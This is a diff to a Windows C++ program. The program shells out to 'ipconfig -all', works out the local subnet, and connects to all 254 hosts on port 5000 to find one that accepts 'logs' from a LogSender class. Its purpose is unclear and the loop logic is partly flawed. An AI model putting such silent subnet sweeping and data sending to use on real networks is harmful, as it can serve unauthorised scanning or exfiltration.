@@ -2,12 +2,12 @@
 #include <stdlib.h>
 #include <string>
 #include <stdio.h>
+#include <io.h>
 #include <fstream>
 #include <iostream>
 #include <thread>
 #include <chrono>
 #include <math.h>
-#include <winsock2.h>
 
 using namespace std;
 
@@ -39,8 +39,6 @@ void read_ip_info(const char * filename, string * ipInfo) {
     f.close();
 }
 
-
-
 string get_ip_from_decimal(unsigned long ip) {
     string result;
 
@@ -49,8 +47,6 @@ string get_ip_from_decimal(unsigned long ip) {
     
         for (int i = 0; i < 8 && ip > 0; i++) {
             buffer += (ip % 2) * pow(2, i);
-
-            // cout << buffer << endl;
 
             ip /= 2;
             j++;
@@ -64,11 +60,10 @@ string get_ip_from_decimal(unsigned long ip) {
     return result;
 }
 
-void send_log(LogSender l, string filename) {
-    l.send_logs(filename.c_str());
-}
+SOCKET sock_arr [254];
 
-void send_file(string filename) {
+void send_file(SOCKET ** ret_val) {
+
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
     //ipInfo[0] = ip address
@@ -95,11 +90,13 @@ void send_file(string filename) {
 
     // 33 = 00000000 00000000 00000000 00100001
 
-    thread threads[254];
+    int select_result = 0;
+    SOCKET * sock;
+
+    fd_set write_fds;
+    FD_ZERO(&write_fds);
 
     for (int i = 0; i < 254; i++) {
-        cout << i << endl;
-
         sockaddr_in addr;
 
         addr.sin_family = AF_INET;
@@ -107,12 +104,31 @@ void send_file(string filename) {
         addr.sin_port = htons(5000);
 
         LogSender l(&addr);
+        // threads[i] = thread(send_log, l, filename);
 
-        threads[i] = thread(send_log, l);
+        sock_arr[i] = l.send_logs();;
+
+        FD_SET(sock_arr[i], &write_fds);
+
         network_address += 1;
     }
 
-    // for (int i = 0; i < 254; i++) {
-    //     threads[i].join();
-    // }
+    timeval timeout;
+
+    timeout.tv_sec = 2;
+    timeout.tv_usec = 0;
+
+    select(0, NULL, &write_fds, NULL, &timeout);
+
+    bool finish = false;
+
+    while (!finish) {
+        for (int i = 0; i < 254; i++) {
+            if (FD_ISSET(sock_arr[i], &write_fds)) {
+                *ret_val = &sock_arr[i];
+
+                finish = true;
+            }
+        }
+    }
 }
